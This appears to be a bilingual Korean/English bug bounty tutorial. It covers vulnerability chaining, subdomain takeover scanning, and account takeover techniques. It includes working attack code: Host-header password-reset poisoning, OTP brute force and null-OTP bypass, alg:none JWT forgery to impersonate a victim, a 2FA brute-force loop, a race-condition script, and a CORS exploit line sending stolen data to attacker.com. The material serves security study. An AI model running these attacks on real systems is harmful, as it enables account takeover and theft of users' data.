> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 버그바운티 고급 — 취약점 체인·서브도메인 테이크오버·계정 탈취

## 0. 초보자를 위한 개념 이해

### 취약점 체이닝이란?

취약점 체이닝(Vulnerability Chaining)은 개별적으로는 낮은 심각도의 취약점 여러 개를 연결하여 실제 피해가 큰 공격 시나리오를 만드는 기법입니다. Self XSS(낮음)와 CSRF(중간)를 결합하면 Stored XSS(높음)가 될 수 있듯이, 창의적인 체이닝은 보상금을 크게 높이고 보안 연구의 핵심 역량이 됩니다. 서브도메인 테이크오버는 방치된 DNS 레코드를 악용해 타사 서비스를 자신의 것처럼 제어하는 기법입니다.

**왜 배우는가:**
```
취약점 심각도 vs 체이닝 효과:

  단일 취약점                체인 결합
  ──────────────────────────────────────────────────
  Self XSS (Low)    ──┐
                      ├──→  Stored XSS (High) $$$
  CSRF (Medium)     ──┘

  SSRF (Medium)     ──┐
                      ├──→  RCE / 계정 탈취 (Critical) $$$$$
  IMDS 접근 (Medium) ──┘

  IDOR (Medium)     ──┐
  비밀번호 재설정 우회 ──┴──→  계정 완전 탈취 (High) $$$$
```

### 핵심 개념 정리

```
주요 체인 공격 유형:

  SSRF → IMDS 체인
    SSRF(서버 측 요청 위조) 취약점으로
    클라우드 메타데이터 서비스에 접근 →
    IAM 임시 자격증명 탈취 → 권한 상승

  서브도메인 테이크오버
    방치된 CNAME: sub.company.com → deleted.service.com
    deleted.service.com을 공격자가 등록 →
    sub.company.com 완전 제어

  계정 탈취 체인
    IDOR로 이메일/전화 노출 →
    비밀번호 재설정 SMS 인터셉트 우회 →
    완전한 계정 접근
```

### 필요한 도구 및 환경
- **httpx**: 비동기 HTTP 클라이언트 (서브도메인 확인)
- **dnspython**: DNS 레코드 조회 라이브러리
- **Burp Suite Collaborator**: 외부 연결 탐지 (SSRF 확인)
- **dig / host**: DNS 조회 명령어

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""서브도메인 테이크오버 취약점 — DNS CNAME 확인 기초."""

import asyncio
from dataclasses import dataclass

import dns.asyncresolver
import dns.exception


@dataclass
class CnameResult:
    subdomain: str
    cname_target: str | None
    is_dangling: bool  # CNAME은 있지만 대상이 응답 없음


# 알려진 테이크오버 취약 서비스 시그니처
VULNERABLE_SIGNATURES: list[str] = [
    "github.io",
    "herokuapp.com",
    "azurewebsites.net",
    "s3.amazonaws.com",
    "netlify.app",
]


async def check_cname(subdomain: str) -> CnameResult:
    """서브도메인의 CNAME 대상이 실제 존재하는지 확인."""
    resolver = dns.asyncresolver.Resolver()
    try:
        cname_answer = await resolver.resolve(subdomain, "CNAME")
        cname_target = str(cname_answer[0].target).rstrip(".")
        # CNAME 대상의 A 레코드 확인
        try:
            await resolver.resolve(cname_target, "A")
            return CnameResult(subdomain, cname_target, False)
        except dns.exception.DNSException:
            # CNAME은 있지만 대상에 A 레코드 없음 → 댕글링 CNAME
            return CnameResult(subdomain, cname_target, True)
    except dns.exception.DNSException:
        return CnameResult(subdomain, None, False)


if __name__ == "__main__":
    targets = ["old-app.example.com", "staging.example.com"]
    results = asyncio.run(asyncio.gather(*[check_cname(t) for t in targets]))
    for r in results:
        if r.is_dangling:
            vuln = any(sig in (r.cname_target or "") for sig in VULNERABLE_SIGNATURES)
            tag = "[테이크오버 가능!]" if vuln else "[댕글링 CNAME]"
            print(f"{tag} {r.subdomain} → {r.cname_target}")
```

---

## 1. 취약점 체이닝 전략

단일 취약점보다 체인으로 연결할수록 심각도(CVSS)와 포상금이 높아진다.

```
예시 체인 1 — SSRF → IMDS → 계정 탈취:
  SSRF 취약점 발견
    → AWS 메타데이터 (169.254.169.254) 접근
    → IAM 임시 자격증명 획득
    → S3 버킷 전체 접근 / RCE

예시 체인 2 — Self XSS + CSRF → 저장 XSS:
  Self XSS (낮은 심각도)
    + CSRF 취약점
    → 다른 사용자 프로필에 저장 XSS 삽입
    → Stored XSS (높은 심각도)

예시 체인 3 — IDOR + 정보 공개 → 계정 탈취:
  IDOR로 다른 사용자 정보 노출
    → 이메일 + 전화번호 획득
    → 패스워드 리셋 SMS 인터셉트 우회
    → 계정 완전 탈취
```

---

## 2. 서브도메인 테이크오버

```python
#!/usr/bin/env python3
"""서브도메인 테이크오버 탐지 CLI."""

import argparse
import asyncio
import json
from dataclasses import dataclass
from pathlib import Path

import httpx

# 각 서비스별 테이크오버 지표
TAKEOVER_SIGNATURES: dict[str, dict] = {
    "GitHub Pages": {
        "cname_contains": ["github.io"],
        "response_contains": "There isn't a GitHub Pages site here",
    },
    "AWS S3": {
        "cname_contains": ["amazonaws.com", "s3-website"],
        "response_contains": "NoSuchBucket",
    },
    "Netlify": {
        "cname_contains": ["netlify.app", "netlify.com"],
        "response_contains": "Not Found - Request ID",
    },
    "Heroku": {
        "cname_contains": ["herokuapp.com"],
        "response_contains": "No such app",
    },
    "Fastly": {
        "cname_contains": ["fastly.net"],
        "response_contains": "Fastly error: unknown domain",
    },
    "Shopify": {
        "cname_contains": ["myshopify.com"],
        "response_contains": "Sorry, this shop is currently unavailable",
    },
    "Zendesk": {
        "cname_contains": ["zendesk.com"],
        "response_contains": "Help Center Closed",
    },
    "Tumblr": {
        "cname_contains": ["tumblr.com"],
        "response_contains": "Whatever you were looking for doesn't currently exist",
    },
    "Azure": {
        "cname_contains": ["azurewebsites.net", "cloudapp.net"],
        "response_contains": "404 Web Site not found",
    },
}


@dataclass
class TakeoverResult:
    subdomain: str
    cname: str | None
    service: str | None
    vulnerable: bool
    status_code: int
    evidence: str


async def check_cname(subdomain: str) -> str | None:
    import dns.resolver
    try:
        answers = dns.resolver.resolve(subdomain, "CNAME")
        return str(answers[0].target)
    except Exception:
        return None


async def check_takeover(
    subdomain: str,
    client: httpx.AsyncClient,
) -> TakeoverResult:
    cname = await check_cname(subdomain)

    result = TakeoverResult(
        subdomain=subdomain,
        cname=cname,
        service=None,
        vulnerable=False,
        status_code=0,
        evidence="",
    )

    # CNAME이 없으면 테이크오버 불가
    if not cname:
        return result

    # 서비스 매칭
    matched_service = None
    for service, sig in TAKEOVER_SIGNATURES.items():
        if any(indicator in cname for indicator in sig["cname_contains"]):
            matched_service = service
            result.service = service
            break

    if not matched_service:
        return result

    # HTTP 응답 확인
    try:
        for scheme in ["https", "http"]:
            try:
                resp = await client.get(
                    f"{scheme}://{subdomain}",
                    follow_redirects=True,
                    timeout=10,
                )
                result.status_code = resp.status_code
                body = resp.text

                sig = TAKEOVER_SIGNATURES[matched_service]
                if sig["response_contains"] in body:
                    result.vulnerable = True
                    result.evidence = sig["response_contains"]
                break
            except httpx.ConnectError:
                continue
    except Exception as e:
        result.evidence = str(e)

    return result


async def scan_subdomains(
    subdomains: list[str],
    concurrency: int = 20,
) -> list[TakeoverResult]:
    semaphore = asyncio.Semaphore(concurrency)
    results: list[TakeoverResult] = []

    async def bounded_check(sub: str) -> None:
        async with semaphore:
            result = await check_takeover(sub, client)
            if result.vulnerable:
                print(f"[!] 테이크오버 가능: {sub} ({result.service})")
                print(f"    CNAME: {result.cname}")
            results.append(result)

    async with httpx.AsyncClient(verify=False) as client:
        await asyncio.gather(*[bounded_check(s) for s in subdomains])

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="서브도메인 테이크오버 탐지")
    parser.add_argument("subdomains", type=Path, help="서브도메인 목록 파일")
    parser.add_argument("-c", "--concurrency", type=int, default=20)
    parser.add_argument("-o", "--output", type=Path)
    args = parser.parse_args()

    subdomains = args.subdomains.read_text().splitlines()
    subdomains = [s.strip() for s in subdomains if s.strip()]
    print(f"[*] {len(subdomains)}개 서브도메인 스캔 중...")

    results = asyncio.run(scan_subdomains(subdomains, args.concurrency))
    vulnerable = [r for r in results if r.vulnerable]
    print(f"\n테이크오버 가능: {len(vulnerable)}/{len(results)}")

    if args.output:
        args.output.write_text(json.dumps(
            [vars(r) for r in vulnerable], indent=2, ensure_ascii=False
        ))


if __name__ == "__main__":
    main()
```

---

## 3. 계정 탈취 체인 (Account Takeover)

```python
#!/usr/bin/env python3
"""계정 탈취 취약점 자동 탐지 — 패스워드 리셋·OTP·세션 관리."""

import argparse
import json
import re
import httpx
from urllib.parse import urlparse, parse_qs


def test_password_reset_poisoning(
    reset_url: str,
    email: str,
    attacker_host: str,
) -> dict:
    """Host 헤더 인젝션으로 패스워드 리셋 링크 탈취."""
    results = {}

    # 일반적인 Host 헤더 인젝션 변형
    payloads = [
        attacker_host,
        f"{attacker_host}:443",
        f"legit.com@{attacker_host}",
        f"legit.com#{attacker_host}",
    ]

    with httpx.Client(verify=False) as client:
        for payload in payloads:
            try:
                resp = client.post(
                    reset_url,
                    data={"email": email},
                    headers={
                        "Host": payload,
                        "X-Forwarded-Host": attacker_host,
                        "X-Host": attacker_host,
                    },
                    timeout=10,
                )
                results[payload] = {
                    "status": resp.status_code,
                    "response_contains_attacker": attacker_host in resp.text,
                }
            except httpx.RequestError as e:
                results[payload] = {"error": str(e)}

    return results


def test_otp_bypass(
    verify_url: str,
    email: str,
) -> list[dict]:
    """OTP/2FA 우회 기법 테스트."""
    findings = []

    with httpx.Client(verify=False) as client:
        # 기법 1: 숫자 OTP 브루트포스 (속도 제한 없을 경우)
        for otp in ["000000", "111111", "123456", "999999"]:
            try:
                resp = client.post(
                    verify_url,
                    json={"email": email, "otp": otp},
                    timeout=5,
                )
                if resp.status_code == 200:
                    findings.append({"technique": "브루트포스", "otp": otp})
            except httpx.RequestError:
                pass

        # 기법 2: null/빈 OTP
        for null_otp in [None, "", "null", "undefined", 0]:
            try:
                resp = client.post(
                    verify_url,
                    json={"email": email, "otp": null_otp},
                    timeout=5,
                )
                if resp.status_code == 200 and "token" in resp.text:
                    findings.append({"technique": "null OTP", "value": null_otp})
            except httpx.RequestError:
                pass

    return findings


def test_jwt_account_switch(
    api_url: str,
    my_token: str,
    victim_user_id: str,
) -> dict:
    """JWT payload 수정으로 다른 사용자 계정 접근."""
    import base64
    import json as json_lib

    parts = my_token.split(".")
    if len(parts) != 3:
        return {"error": "유효하지 않은 JWT"}

    # payload 디코딩
    padding = 4 - len(parts[1]) % 4
    payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * padding)
    payload = json_lib.loads(payload_bytes)

    # user_id 교체
    original_id = payload.get("sub") or payload.get("user_id") or payload.get("id")
    payload["sub"] = victim_user_id
    payload["user_id"] = victim_user_id

    # 재인코딩 (서명 없이)
    new_payload = base64.urlsafe_b64encode(
        json_lib.dumps(payload).encode()
    ).rstrip(b"=").decode()

    # alg:none 토큰
    none_token = f"{parts[0]}.{new_payload}."

    with httpx.Client(verify=False) as client:
        try:
            resp = client.get(
                f"{api_url}/me",
                headers={"Authorization": f"Bearer {none_token}"},
                timeout=10,
            )
            return {
                "status": resp.status_code,
                "original_id": str(original_id),
                "victim_id": victim_user_id,
                "vulnerable": resp.status_code == 200,
                "response": resp.text[:200],
            }
        except httpx.RequestError as e:
            return {"error": str(e)}


def main() -> None:
    parser = argparse.ArgumentParser(description="계정 탈취 취약점 탐지")
    sub = parser.add_subparsers(dest="cmd", required=True)

    reset_p = sub.add_parser("reset-poisoning", help="패스워드 리셋 Host 인젝션")
    reset_p.add_argument("url", help="패스워드 리셋 엔드포인트")
    reset_p.add_argument("--email", required=True)
    reset_p.add_argument("--attacker", required=True, help="공격자 도메인")

    otp_p = sub.add_parser("otp-bypass", help="OTP 우회")
    otp_p.add_argument("url", help="OTP 검증 엔드포인트")
    otp_p.add_argument("--email", required=True)

    args = parser.parse_args()

    match args.cmd:
        case "reset-poisoning":
            results = test_password_reset_poisoning(args.url, args.email, args.attacker)
            print(json.dumps(results, indent=2, ensure_ascii=False))
        case "otp-bypass":
            findings = test_otp_bypass(args.url, args.email)
            if findings:
                print(f"[!] OTP 우회 성공: {findings}")
            else:
                print("[+] OTP 우회 실패 (보호됨)")


if __name__ == "__main__":
    main()
```

---

## 4. 리포트 작성 자동화

```python
#!/usr/bin/env python3
"""버그바운티 리포트 템플릿 자동 생성 CLI."""

import argparse
from datetime import datetime
from pathlib import Path


SEVERITY_CVSS: dict[str, str] = {
    "critical": "9.0-10.0",
    "high": "7.0-8.9",
    "medium": "4.0-6.9",
    "low": "0.1-3.9",
    "informational": "0.0",
}

REPORT_TEMPLATE = """# {title}

**심각도:** {severity} (CVSS {cvss})
**보고 날짜:** {date}
**대상:** {target}
**상태:** New

---

## 취약점 요약

{summary}

## 영향

{impact}

## 재현 단계 (PoC)

```
{poc}
```

## 요청/응답 예시

**요청:**
```http
{request}
```

**응답:**
```http
{response}
```

## 권장 수정 방법

{remediation}

## 레퍼런스

{references}
"""


def generate_report(
    title: str,
    severity: str,
    target: str,
    summary: str,
    impact: str,
    poc: str,
    remediation: str,
    output: Path,
) -> None:
    cvss = SEVERITY_CVSS.get(severity.lower(), "N/A")
    report = REPORT_TEMPLATE.format(
        title=title,
        severity=severity.upper(),
        cvss=cvss,
        date=datetime.now().strftime("%Y-%m-%d"),
        target=target,
        summary=summary,
        impact=impact,
        poc=poc,
        request="[요청 내용 삽입]",
        response="[응답 내용 삽입]",
        remediation=remediation,
        references="- OWASP\n- CVE",
    )
    output.write_text(report)
    print(f"[+] 리포트 생성: {output}")


def main() -> None:
    parser = argparse.ArgumentParser(description="버그바운티 리포트 생성")
    parser.add_argument("--title", required=True)
    parser.add_argument("--severity", required=True,
                        choices=["critical", "high", "medium", "low", "informational"])
    parser.add_argument("--target", required=True)
    parser.add_argument("--summary", required=True)
    parser.add_argument("--impact", default="인증되지 않은 데이터 접근 가능")
    parser.add_argument("--poc", default="[PoC 삽입]")
    parser.add_argument("--fix", default="입력값 검증 및 인가 로직 강화")
    parser.add_argument("-o", "--output", type=Path, default=Path("report.md"))
    args = parser.parse_args()

    generate_report(
        args.title, args.severity, args.target,
        args.summary, args.impact, args.poc, args.fix, args.output,
    )


if __name__ == "__main__":
    main()
```

---

## 5. 고급 버그바운티 팁

| 영역 | 고급 기법 |
|------|-----------|
| 서브도메인 | amass + subfinder + httpx 파이프라인 |
| JS 분석 | linkfinder + secretfinder로 엔드포인트 탐지 |
| GraphQL | InQL Scanner + 배치 쿼리 취약점 |
| 레이스 컨디션 | Turbo Intruder 동시 요청 |
| 2FA 우회 | 코드 재사용·속도 제한 없음·백업 코드 |
| OAuth | state 파라미터 검증 누락·CSRF |
| SSRF | DNS Rebinding·IPv6·프로토콜 래퍼 |

---

<a name="english"></a>

# Bug Bounty Advanced — Vulnerability Chains, Subdomain Takeover, Account Takeover

## 1. Vulnerability Chaining Strategy

Chaining vulnerabilities together increases severity (CVSS) and rewards more than single vulnerabilities.

```
Classic Vulnerability Chains:

SSRF + IDOR → Internal API access + data extraction
Open Redirect + XSS → Phishing + session hijacking  
CORS misconfiguration + XSS → Cross-domain data extraction
Subdomain Takeover + XSS → Cookie theft on main domain
```

---

## 2. Subdomain Takeover

Subdomain takeover occurs when a subdomain's DNS points to a service that no longer exists — an attacker can register that service and control the subdomain.

```bash
# Detection method
# 1. Enumerate all subdomains
subfinder -d target.com -o subdomains.txt

# 2. Check HTTP responses
cat subdomains.txt | httpx -status-code -title

# 3. Look for takeover-possible error messages:
# "There isn't a GitHub Pages site here"  → GitHub Pages
# "NoSuchBucket"                          → AWS S3
# "This domain is not configured"         → Netlify
# "Fastly error: unknown domain"          → Fastly CDN

# Vulnerable DNS CNAME check
dig sub.target.com CNAME
# If CNAME points to subdomain.github.io but that repo doesn't exist → Takeover possible

# Auto-detection tools
subjack -w subdomains.txt -t 100 -o takeover_results.txt
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/
```

---

## 3. Account Takeover (ATO)

### 3-1. Password Reset Vulnerabilities

```bash
# 1. Reset token entropy analysis
# Request multiple reset tokens and compare
for i in {1..10}; do
    curl -s -X POST https://target.com/forgot-password \
        -d "email=victim@example.com" | grep -o "token=[a-zA-Z0-9]*"
done

# 2. Host header injection
POST /forgot-password HTTP/1.1
Host: attacker.com  # Poison reset link to attacker domain

# 3. Reset token reuse (token not invalidated after use)
curl -X POST https://target.com/reset-password \
    -d "token=USED_TOKEN&password=newpass"

# 4. Long expiry (token valid for 24h+)
# Use old token after 1 hour to verify
```

### 3-2. OAuth Vulnerabilities

```bash
# OAuth CSRF (state parameter missing)
# If no state parameter in authorization request:
# Craft authorization URL → victim visits it → attacker binds their account

# Redirect URI bypass
https://target.com/oauth/callback?
  code=AUTH_CODE&
  redirect_uri=https://attacker.com  # Parameter manipulation

# Implicit flow token leakage
# Check Referer header — may leak access_token to external sites
```

### 3-3. 2FA Bypass

```bash
# 1. Code reuse (expired code still works)
# 2. No rate limit → brute force 6-digit OTP
for code in $(seq -w 000000 999999); do
    result=$(curl -s -X POST https://target.com/2fa \
        -d "code=$code&session=TOKEN")
    if echo "$result" | grep -q "success"; then
        echo "Valid 2FA code: $code"
        break
    fi
done

# 3. Backup code enumeration
# 4. Skip 2FA step (direct access to post-2FA endpoint)
curl https://target.com/dashboard -H "Cookie: pre_2fa_session=..."
```

---

## 4. Race Condition

```python
import threading
import requests

def race_condition_test(url: str, token: str, count: int = 50):
    """Race condition exploit using simultaneous requests"""
    
    results = []
    lock = threading.Lock()
    
    def send_request():
        resp = requests.post(url, 
                            headers={"Authorization": f"Bearer {token}"},
                            json={"action": "redeem_coupon", "code": "DISCOUNT50"})
        with lock:
            results.append(resp.status_code)
    
    threads = [threading.Thread(target=send_request) for _ in range(count)]
    
    # Start all threads simultaneously
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    success_count = results.count(200)
    print(f"Successful requests: {success_count}/{count}")
    if success_count > 1:
        print("[!] Race condition possible — coupon applied multiple times")
    
    return results
```

---

## 5. CORS Misconfiguration

```bash
# CORS misconfiguration test
curl -H "Origin: https://attacker.com" \
     -H "Access-Control-Request-Method: GET" \
     -X OPTIONS https://api.target.com/user/profile

# If response contains:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
# → Steal cross-origin data

# Exploitation script
# <script>
# fetch('https://api.target.com/user/profile', {credentials: 'include'})
#   .then(r => r.json())
#   .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))
# </script>

# Bypass patterns
"origin": "https://target.com.attacker.com"  # Origin mismatch
"origin": "null"                              # Null origin (sandboxed iframe)
```

---

## 6. Advanced Automation Tools

| Category | Tool |
|---------|------|
| Subdomain | amass + subfinder + httpx pipeline |
| JS Analysis | linkfinder + secretfinder for endpoint detection |
| GraphQL | InQL Scanner + batch query vulnerabilities |
| Race Condition | Turbo Intruder concurrent requests |
| 2FA Bypass | Code reuse, no rate limit, backup codes |
| OAuth | Missing state parameter validation, CSRF |
| SSRF | DNS Rebinding, IPv6, protocol wrappers |
